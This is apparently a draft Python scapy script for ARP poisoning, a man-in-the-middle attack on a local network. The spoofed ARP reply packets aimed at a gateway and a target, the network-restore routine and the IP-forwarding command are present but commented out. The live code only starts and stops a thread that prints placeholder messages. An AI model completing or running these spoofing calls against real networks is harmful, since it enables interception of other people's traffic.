from scapy.all import *
import os
import threading
import time

# class ArpPoisonVial():
#     stop = False

#     def __init__(self, g_ip, t_ip, g_mac, t_mac):
#         self.gateway_ip = g_ip
#         self.target_ip = t_ip
#         self.gateway_mac = g_mac
#         self.target_mac = t_mac

stop = False

# def poison(self):
#     # Send ARP reply with false IP and MAC address information
#     # send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip))
#     # send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip))
#     while not (self.stop):
#         # self.poison()
#         # TODO: make sleep time configurable
#         time.sleep(2)
#         print('do me an poison')
#         print(f"stop flag value: {self.stop}")
#         if (self.stop):
#             break

# def restore_network(self):
#     # Send ARP reply with correct IP and MAC addresses to affected targets
#     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip), count=5)
#     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip), count=5)
#     # Disable IP forwarding
#     os.system("sysctl -w net.ipv4.ip_forward=0")

# def get_mac(self, ip):
#     resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip))
#     for s,r in resp:
#         return r[ARP].hwsrc
#     return None
def start():
    # requires elevated privileges
    #os.system("sysctl -w net.ipv4.ip_forward=1")
    def dopoison():
    # Send ARP reply with false IP and MAC address information
    # send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip))
    # send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip))
        while (stop == False):
            # self.poison()
            # TODO: make sleep time configurable
            time.sleep(2)
            print('do me an poison')
            print(f"stop flag value: {stop}")
            if (stop == True):
                break
    thread = threading.Thread(target=dopoison)  
    thread.start() 
    #self.restore_network()

def stop_poison():
    global stop
    stop = True
    print('stopping')

def start_poison():
    global stop
    stop = False
    print('starting')
    start()



start_poison()
time.sleep(5)
stop_poison()
